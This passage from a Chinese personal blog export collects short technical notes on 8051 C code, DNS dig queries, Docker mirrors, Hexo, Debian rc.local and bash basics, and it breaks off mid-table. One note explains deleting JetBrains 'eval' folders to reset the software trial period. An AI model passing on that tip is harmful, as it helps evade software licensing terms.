<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uchar unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"></span><br><span class="line">uchar flag=<span class="number">0</span>;</span><br><span class="line">uchar code sendBuf[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;;</span><br><span class="line">sbit P1_0=P1^<span class="number">0</span>;</span><br><span class="line">sbit P1_1=P1^<span class="number">1</span>;</span><br><span class="line">uchar r;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay</span><span class="params">(uchar)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SCON=<span class="number">0x10</span>; <span class="comment">//方式0允许输入数据</span></span><br><span class="line">	EA=<span class="number">1</span>;</span><br><span class="line">	P2=sendBuf[flag];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(P1_0==<span class="number">0</span>)&#123;</span><br><span class="line">			ES=<span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			ES=<span class="number">0</span>;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sint</span><span class="params">()</span> interrupt 4&#123;</span><br><span class="line">	P1_1=<span class="number">0</span>;</span><br><span class="line">	delay(<span class="number">1</span>);</span><br><span class="line">	P1_1=<span class="number">1</span>;</span><br><span class="line">	r=SBUF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(r!=<span class="number">0xff</span>)&#123;</span><br><span class="line">		<span class="keyword">switch</span>(r)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfe</span>:flag=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfd</span>:flag=<span class="number">1</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xfb</span>:flag=<span class="number">2</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xf7</span>:flag=<span class="number">3</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xef</span>:flag=<span class="number">4</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xdf</span>:flag=<span class="number">5</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0xbf</span>:flag=<span class="number">6</span>;<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0x7f</span>:flag=<span class="number">7</span>;<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	P2=sendBuf[flag];</span><br><span class="line">	RI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay</span><span class="params">(uchar ms)</span>&#123;</span><br><span class="line">	uchar i;</span><br><span class="line">	<span class="keyword">while</span>(ms)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">123</span>;i++);</span><br><span class="line">			ms--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>单片机</category>
      </categories>
  </entry>
  <entry>
    <title>ARM-相关知识及传送门</title>
    <url>/ARM-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%8F%8A%E4%BC%A0%E9%80%81%E9%97%A8/</url>
    <content><![CDATA[<h3 id="portal">Portal</h3>
<p><a
href="https://azeria-labs.com/writing-arm-assembly-part-1/">官方介绍</a>
<a
href="https://blog.csdn.net/MyArrow/article/details/9701499">CPSR/SPSR</a>
<a
href="https://blog.csdn.net/caihaitao2000/article/details/84843270">异常处理</a>
<a
href="https://blog.csdn.net/SoaringLee_fighting/article/details/81906495">arm架构64位入门基础：架构分析、寄存器、调用规则、指令集、程序调试以及参考手册</a>
<a
href="https://blog.csdn.net/SoaringLee_fighting/article/details/82530435">arm架构64位（AArch64）汇编优化总结</a></p>
]]></content>
      <categories>
        <category>ARM</category>
      </categories>
  </entry>
  <entry>
    <title>CAD</title>
    <url>/CAD/</url>
    <content><![CDATA[<h2 id="参考资料">参考资料</h2>
<p><a
href="https://zhuanlan.zhihu.com/p/337182324?ivk_sa=1024320u">史上最全CAD快捷键汇总大全
- 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>2021计划</title>
    <url>/2021%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h1 id="计划">2021计划</h1>
<p>今年呢，又是让人神经不能放松下来的一年啊，刚刚听说村子里的人有与无症状感染者接触的人员，已经被拉走隔离了，希望他没有事情吧，今年2020实在是太糟心了，可是我们又能怎样呢？接受现实吧，人生可不能<code>reset --hard HEAD~X</code>那样回退，只能向前看了啊。</p>
<p>今年的计划呢，分为两个备份，一个当然是能正常开学，回归校园的计划啦，其实在学校里根本没有计划，每天只要能学一点东西就很好了，就算每天都去实验室坐一天思考，我仍想不到我有什么自己想做的事。</p>
<p>当然还有一份计划是不返校在家，嘻嘻，这个可就好玩多啦。</p>
<ol type="1">
<li>烤炉-made by
黄泥/红砖，其实2020年早就想做的，一直懒在家里没有做，后面就去练车了。
<ol type="1">
<li>木炭窖咯，什么都要靠买才是一点意思都没有呢。</li>
<li>砖块的话，就看看自己家里还有没有剩余的红砖了，如果没有的话，砖窖也可以列入计划之中，强度需求并不高，只需要别轻易碎掉就好，黄泥的话用稻草和在一起可以增加强度，砖块只是备用方案，就看到时候能不能撑住吧。</li>
<li>燃烧室理所应当的要和放置食物的地方分开啦，我可能会用铁板导热，等里面的温度满足要求的时候，我会把所有风口都堵住保持温度。</li>
</ol></li>
<li>糕点制作
<ol type="1">
<li>电动打蛋器：必备！！！！心水了好久了，一直都舍不得买，纯手动累死人啦--鸡蛋管够，哈哈哈哈</li>
<li>电烤炉：容积大一点吧，比较方便做戚风，与之配对的当然就是各种模具啦，期待ing~</li>
<li>低筋面粉</li>
</ol></li>
<li>烧烤架
<ol type="1">
<li>其实如果放假时间还是和2020年差不多的话，我想尝试养鸡，自给自足，哈哈哈</li>
</ol></li>
<li>发电装置
<ol type="1">
<li>妈妈在家经常会唠叨我用电量很大，大晚上还不睡觉，哎，我也没办法啊，所以说我打算向<strong>KREOSAN</strong>大魔王学习，做一些类似于太阳能板发电，风力发电的东西，这个嘛，可以组装也可以买现成的，但是买现成的确实没啥挑战，还是自己焊着玩有意思一点。</li>
<li>逆变器：这玩意我觉得不太好做，所以还是买现成的吧。</li>
<li>电池组：18650-12V电池组可能比较香一点，毕竟蓄电池也太贵了些。</li>
<li>可以向KREOSAN他们学着用旧自行车做一个人力发电装置。自行车加上直流电机。emmm，锻炼+发电，岂不美哉~</li>
</ol></li>
<li>学习投资
<ol type="1">
<li>基金真好玩，我这条命都是白酒给的。</li>
<li>说真的，应该系统的学习一下了。</li>
</ol></li>
<li>完成工作</li>
<li>发动机
<ol type="1">
<li>其实我还想玩斯特林外燃机之类的用来发电，真的好有趣的样子！</li>
<li>只能说，机械，才是男人的浪漫</li>
</ol></li>
<li>SDR
<ol type="1">
<li>想玩好久了，我也想入坑软件定义无线电！</li>
</ol></li>
</ol>
<p>目前就这些，我后面会进行补充的，一定还有更好玩的事等着我去发现！</p>
]]></content>
      <categories>
        <category>计划</category>
      </categories>
  </entry>
  <entry>
    <title>Dns服务相关</title>
    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
<p>显示域名详细信息,所有记录
以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令
<code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code>
全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析
<code>dig -x ip地址 @DNS服务器</code></p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>Docker源</title>
    <url>/Docker%E6%BA%90/</url>
    <content><![CDATA[<h1 id="配置文件">配置文件</h1>
<h2 id="daemon.json">daemon.json</h2>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://registry.docker-cn.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>Docker-composed模板</title>
    <url>/Docker-composed%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title>Emacs-快捷键</title>
    <url>/Emacs-%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h2 id="快捷键">快捷键</h2>
<h3 id="orgmode">orgmode</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">C-c+! 当前时间戳</span><br><span class="line">C-c+C-s 开始/准备时间</span><br><span class="line">C-c+C-D 死限/Deadline</span><br><span class="line">C+S+Enter 创建一个同标题等级同状态的行</span><br><span class="line">C-c+C-c 补全表格，行首应该有一个竖线符号</span><br><span class="line">A+方向键 调整标题等级</span><br><span class="line">S+方向键 调整状态</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr />
<h3 id="链接">链接</h3>
<p><a
href="https://www.cnblogs.com/kunyuanjushi/p/5951404.html">常用快捷键</a></p>
]]></content>
      <categories>
        <category>emacs</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo-插件及配置</title>
    <url>/Hexo-%E6%8F%92%E4%BB%B6%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="本地搜索">本地搜索</h3>
<h4 id="插件安装">插件安装</h4>
<p>在hexo根目录安装 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure> &gt;
我安装完插件后,hexo就被卸载了,还要使用<code>yarn upgrade</code>重新安装一遍hexo,你也可以使用<code>yarn add hexo-generator-searchdb</code>命令安装插件</p>
<p>修改根目录下的_config.yml <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">    <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>
编辑主题配置文件,我是用的next主题 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure> #### 出现的异常
当我点击搜索按钮时,会发生页面无限加载,问题是我的一篇文章中出现了非<code>utf-8</code>的文字,所以造成了xml报错,无法被读取.根据根目录下的<code>search.xml</code>出错信息,找到原文章删除特殊字符即可.</p>
<h3 id="引用标签">引用标签</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% asset_path slug %&#125; #路径引用</span><br><span class="line">&#123;% asset_img slug [title] %&#125; #图片引用</span><br><span class="line">&#123;% asset_link slug [title] %&#125; #文件引用,用作下载链接</span><br></pre></td></tr></table></figure>
<h3 id="latex支持">latex支持</h3>
<h4
id="卸载原有渲染器安装hexo-renderer-kramed">卸载原有渲染器,安装<strong>hexo-renderer-kramed</strong></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn remove hexo-renderer-marked</span><br><span class="line">yarn add hexo-renderer-kramed</span><br></pre></td></tr></table></figure>
<h4 id="修改next配置文件">修改next配置文件</h4>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Math Equations Render Support</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Default (true) will load mathjax / katex script on demand.</span></span><br><span class="line">  <span class="comment"># That is it only render those page which has `mathjax: true` in Front Matter.</span></span><br><span class="line">  <span class="comment"># If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">engine:</span> <span class="string">mathjax</span></span><br><span class="line">  <span class="comment">#engine: katex</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># hexo-rendering-pandoc (or hexo-renderer-kramed) needed to full MathJax support.</span></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">cdn:</span> <span class="string">https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML</span> <span class="comment">#问号后面的是引用配置</span></span><br><span class="line">    <span class="comment">#cdn: //cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML</span></span><br></pre></td></tr></table></figure>
<h4 id="修改解析错误">修改解析错误</h4>
<p>这里的解析错误代表单行引用时要加四个反斜线才能正常换行</p>
<h4 id="更换pandoc解码器">更换pandoc解码器</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn remove hexo-renderer-marked</span><br><span class="line">yarn add hexo-renderer-pandoc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>博客相关</category>
      </categories>
  </entry>
  <entry>
    <title>Jetbrains注册信息存储目录</title>
    <url>/Jetbrains%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<h1 id="存储目录">存储目录</h1>
<p>如果你想重置某个软件的注册时间的话,删除此文件夹下面的对应软件的<code>eval</code>文件夹下的注册信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Divint3\AppData\Roaming\JetBrains</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-Debian杂谈</title>
    <url>/Linux-Debian%E6%9D%82%E8%B0%88/</url>
    <content><![CDATA[<h3 id="rc.local服务">rc.local服务</h3>
<h4 id="systemd-服务配置文件">systemd 服务配置文件</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian9 ~ # cat /lib/systemd/system/rc.local.service</span><br><span class="line">#  This file is part of systemd.</span><br><span class="line">#</span><br><span class="line">#  systemd is free software; you can redistribute it and/or modify it</span><br><span class="line">#  under the terms of the GNU Lesser General Public License as published by</span><br><span class="line">#  the Free Software Foundation; either version 2.1 of the License, or</span><br><span class="line">#  (at your option) any later version.</span><br><span class="line"></span><br><span class="line"># This unit gets pulled automatically into multi-user.target by</span><br><span class="line"># systemd-rc-local-generator if /etc/rc.local is executable.</span><br><span class="line">[Unit]</span><br><span class="line">Description=/etc/rc.local Compatibility</span><br><span class="line">ConditionFileIsExecutable=/etc/rc.local</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">GuessMainPID=no</span><br></pre></td></tr></table></figure>
<h4 id="初始化rc.local">初始化rc.local</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt;/etc/rc.local</span><br><span class="line">#!/bin/sh -e</span><br><span class="line">#</span><br><span class="line"># rc.local</span><br><span class="line">#</span><br><span class="line"># This script is executed at the end of each multiuser runlevel.</span><br><span class="line"># Make sure that the script will &quot;exit 0&quot; on success or any other</span><br><span class="line"># value on error.</span><br><span class="line">#</span><br><span class="line"># In order to enable or disable this script just change the execution</span><br><span class="line"># bits.</span><br><span class="line">#</span><br><span class="line"># By default this script does nothing.</span><br><span class="line"></span><br><span class="line">exit 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<p>记得加权限<code>chmod +x /etc/rc.local</code></p>
<h4 id="启动服务">启动服务</h4>
<p><code>systemctl start rc-local</code></p>
<h3 id="重新设定字符集">重新设定字符集</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
<h3 id="设定启动级别">设定启动级别</h3>
<h4 id="systemctlgrub">systemctl+grub</h4>
<h5 id="debian">debian</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl get-default <span class="comment">#查看默认启动级别</span></span><br><span class="line">systemctl list-units --<span class="built_in">type</span>=target <span class="comment">#查看所有target</span></span><br><span class="line">systemctl set-default multi-user.target <span class="comment">#设定默认启动级别,多用户文本模式</span></span><br></pre></td></tr></table></figure>
<h5 id="ubuntu">ubuntu</h5>
<p>将GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"的一行注释掉：
<code># GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"</code>
将GRUB_CMDLINE_LINUX=""的一行修改为：
<code>GRUB_CMDLINE_LINUX="text"</code>
去掉#GRUB_TERMINAL=console一行的注释，即修改为：
<code>GRUB_TERMINAL=console</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-grub</span><br><span class="line">systemctl set-default multi-user.target</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>debian特性</category>
      </categories>
  </entry>
  <entry>
    <title>Linux-bash</title>
    <url>/Linux-bash/</url>
    <content><![CDATA[<h1 id="bash">Bash</h1>
<h2 id="shell是一种弱类型的编程语言">shell是一种弱类型的编程语言</h2>
<h3 id="配置文件">配置文件</h3>
<p><strong>profile</strong>：定义环境变量，运行程序或者脚本，只在用户登录时才会运行该配置文件</p>
<p><strong>bashrc</strong>：设置本地变量，定义命令别名</p>
<span id="more"></span>
<h4 id="登录式shell配置文件及次序">登录式shell，配置文件及次序</h4>
<p><code>/etc/profile --&gt; /etc/profile.d/*.sh --&gt; ~/.bash_profile --&gt; ~/.bashrc --&gt; /etc/bashrc</code></p>
<h4 id="非登录式shell配置文件及次序">非登录式shell，配置文件及次序</h4>
<p><code>~/.bashrc --&gt; /etc/bashrc --&gt; /etc/profile.d/*.sh</code></p>
<hr />
<h2 id="linux变量">linux变量</h2>
<p><strong>变量赋值</strong>：变量名=变量值</p>
<p><strong>撤销变量</strong>：unset 变量名</p>
<p><strong>引用变量</strong>：$变量名</p>
<h3 id="bash变量类型">bash变量类型</h3>
<ol type="1">
<li><strong>环境变量</strong>：作用域为当前shell进程及其子进程
<ol type="1">
<li>查看环境变量
<ol type="1">
<li>printenv</li>
<li>env</li>
<li>export</li>
</ol></li>
</ol></li>
<li><strong>本地变量</strong>：作用域为整个bash进程
<ol type="1">
<li>查看本地变量
<ol type="1">
<li>set</li>
</ol></li>
</ol></li>
<li><strong>特殊变量</strong>
<ol type="1">
<li><code>$?</code>
<ol type="1">
<li>返回上一个命令执行状态返回值，值为0代表程序正确执行，非零都为错误执行</li>
</ol></li>
<li><code>$#</code>
<ol type="1">
<li>返回传入参数个数</li>
</ol></li>
<li><code>$@</code>
<ol type="1">
<li>返回参数内容，多个参数返回列表</li>
</ol></li>
<li><code>$*</code>
<ol type="1">
<li>返回所有参数</li>
</ol></li>
<li><code>$RANDOM</code>
<ol type="1">
<li>生成随机数</li>
</ol></li>
<li><code>$$</code>
<ol type="1">
<li>返回当前进程id</li>
</ol></li>
<li><code>$!</code>
<ol type="1">
<li>后台运行的最后一个进程的id号</li>
</ol></li>
</ol></li>
<li><strong>位置变量</strong>
<ol type="1">
<li><code>$0</code>
<ol type="1">
<li>脚本名，带上所有引用路径</li>
</ol></li>
<li><code>$1-9</code>
<ol type="1">
<li>参数</li>
</ol></li>
<li>注意，<code>$10</code>
不能获取第十个参数，获取第十个参数需要​<code>$&#123;10&#125;</code>。当n&gt;=10时，需要使用<code>$&#123;n&#125;</code>来获取参数</li>
</ol></li>
</ol>
<p>shift命令，踢出参数</p>
<hr />
<h3 id="数组">数组</h3>
<ol type="1">
<li>声明数组
<ol type="1">
<li><code>declare -a 数组名</code></li>
</ol></li>
<li>数组赋值
<ol type="1">
<li>数组名={元素1 元素2 ……}
<ol type="1">
<li>human={jack tom divint3}</li>
</ol></li>
<li>数组名={[元素位置1]=元素值1 [元素位置]2=元素2 ……}
<ol type="1">
<li>human={[0]=jack [1]=tom [6]=Divint3}</li>
</ol></li>
</ol></li>
</ol>
<h2 id="管道与重定向">管道与重定向</h2>
<h3 id="输入输出重定向">输入输出重定向</h3>
<ol type="1">
<li>标准输入：代码为 0 ；或称为 stdin ；使用的方式为 &lt;</li>
<li>标准输出：代码为 1 ；或称为 stdout；使用的方式为 1&gt;</li>
<li>错误输出：代码为 2 ；或称为 stderr；使用的方式为 2&gt;</li>
</ol>
<p>输入重定向,一般输入到一个程序中:<code>&lt;</code>
输出通定向:<code>&gt;</code> 追加输出重定向:<code>&gt;&gt;</code>
在此处生成文档 Here Document:<code>&lt;&lt;</code></p>
<p>例如: 不指定输出位置,则输出到屏幕:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Divint3:~<span class="comment"># cat &lt;&lt; EOF</span></span><br><span class="line">&gt; The First Line.</span><br><span class="line">&gt; The Second Line.</span><br><span class="line">&gt; EOF</span><br><span class="line">The First Line.</span><br><span class="line">The Second Line.</span><br></pre></td></tr></table></figure>
<p>指定输出位置,则输出到指定位置: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Divint3:~<span class="comment"># cat &lt;&lt; EOF &gt;&gt; doc.txt</span></span><br><span class="line">&gt; The First Line.</span><br><span class="line">&gt; The Second Line.</span><br><span class="line">&gt; EOF</span><br><span class="line">root@Divint3:~<span class="comment"># cat doc.txt </span></span><br><span class="line">The First Line.</span><br><span class="line">The Second Line.</span><br></pre></td></tr></table></figure></p>
<p>bash中使用&gt;&lt;|时 -用作占位符</p>
<p><code>set -C</code>:阻止覆盖重定向 强制覆盖输出 <code>&gt;|</code>
<code>set +C</code>:取消阻止覆盖重定向重定向</p>
<p>tee: 既能保证输出可以输出到标准输出(屏幕),也能保证输出到文件中.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@Divint3:~# echo &quot;echo&quot; | tee /tmp/a</span><br><span class="line">echo</span><br><span class="line">root@Divint3:~# cat /tmp/a</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
<h4
id="重定向所有输出标准输出以及标准错误输出">重定向所有输出(标准输出以及标准错误输出)</h4>
<p><code>ls &gt; /dev/null 2&gt;&amp;1</code></p>
<hr />
<h2 id="bash编程">bash编程</h2>
<h3 id="流程控制">流程控制</h3>
<h4 id="分支结构">分支结构</h4>
<h5 id="多行if结构">多行if结构</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h5 id="单行if结构">单行if结构</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(ps -ef | grep -c <span class="string">&quot;ssh&quot;</span>) -gt 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;true&quot;</span>; <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h5 id="if-else">if else</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h5 id="if-elif-else">if elif else</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1</span><br><span class="line"><span class="keyword">elif</span> condition2 </span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    command2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h5 id="case">case</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> 值 <span class="keyword">in</span></span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<h4 id="循环结构">循环结构</h4>
<h5 id="for循环">for循环</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ...;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	command1</span><br><span class="line">	command2</span><br><span class="line">	...</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h5 id="while循环">while循环</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h5 id="until循环">until循环</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">until condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h4 id="跳出循环">跳出循环</h4>
<p><strong>continue</strong>：跳出本次循环进行下一次循环</p>
<p><strong>break</strong>：跳出循环</p>
<hr />
<h3 id="基本运算符">基本运算符</h3>
<h4 id="布尔运算符">布尔运算符</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">运算符</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">！</td>
<td style="text-align: center;">非运算</td>
</tr>
<tr class="even">
<td style="text-align: center;">-o</td>
<td style="text-align: center;">或运算</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-a</td>
<td style="text-align: center;">与运算</td>
</tr>
</tbody>
</table>
<h4 id="关系运算符">关系运算符</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">运算符</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">-eq</td>
<td style="text-align: center;">相等返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-ne</td>
<td style="text-align: center;">不相等返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-gt</td>
<td style="text-align: center;">大于返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-lt</td>
<td style="text-align: center;">小于返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-ge</td>
<td style="text-align: center;">大于等于返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-le</td>
<td style="text-align: center;">小于等于返回true</td>
</tr>
</tbody>
</table>
<h4 id="字符串运算符">字符串运算符</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">运算符</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">=</td>
<td style="text-align: center;">字符串相等返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">!=</td>
<td style="text-align: center;">字符串不相等返回true</td>
</tr>
<tr class="odd">
<td style="text-align: center;">-z</td>
<td style="text-align: center;">字符串长度为0返回true</td>
</tr>
<tr class="even">
<td style="text-align: center;">-n</td>
